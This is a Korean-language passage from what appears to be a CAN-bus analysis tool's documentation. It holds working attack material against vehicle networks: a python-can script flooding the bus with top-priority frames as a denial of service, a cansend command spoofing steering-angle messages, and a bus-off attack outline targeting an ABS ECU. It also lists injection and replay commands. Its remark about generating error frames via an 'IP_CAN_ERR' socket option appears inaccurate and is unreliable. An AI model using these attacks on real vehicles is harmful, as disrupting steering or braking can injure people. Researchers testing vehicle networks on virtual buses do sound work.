# 최대 속도 DoS 예시 (python-can)
import can

bus = can.Bus(channel="vcan0", bustype="socketcan")
msg = can.Message(arbitration_id=0x000, data=b"\xFF" * 8)  # 최고 우선순위
try:
    while True:
        bus.send(msg)
except KeyboardInterrupt:
    bus.shutdown()
```

### 6.2 ECU 사칭 (Spoofing)

특정 ECU ID를 가진 프레임을 주입하여 제어 명령을 덮어씌운다.

```bash
# 스티어링 각도 메시지 사칭 (ID는 차종마다 다름)
cansend can0 0x02B0#0000FF000000FF00
```

### 6.3 버스 오프 공격

```
1. 공격자 노드가 버스에서 ACK를 억제
2. 정상 노드의 TEC 증가 → Error Passive → Bus Off
3. 해당 노드(예: ABS ECU)가 응답 불능 상태
```

실제 구현은 CAN 컨트롤러 레지스터 직접 제어가 필요하며, SocketCAN에서는 `IP_CAN_ERR` 소켓 옵션으로 오류 프레임 생성 가능.

---

## 참고 명령어 요약

```bash
# 기본 캡처 30초
python can_analyzer.py capture --interface vcan0 --output capture.csv --duration 30

# 분석 (상위 30개 ID)
python can_analyzer.py analyze --input capture.csv --top 30

# OBD-II 전체 스캔
python can_analyzer.py scan --interface vcan0 --mode obd2

# 특정 프레임 10회 주입
python can_analyzer.py inject --interface vcan0 --id 0x7DF \
    --data "02 01 0C 00 00 00 00 00" --count 10 --interval 0.1

# 0.5배 속도로 재전송
python can_analyzer.py replay --interface vcan0 --input capture.csv --rate 0.5
```
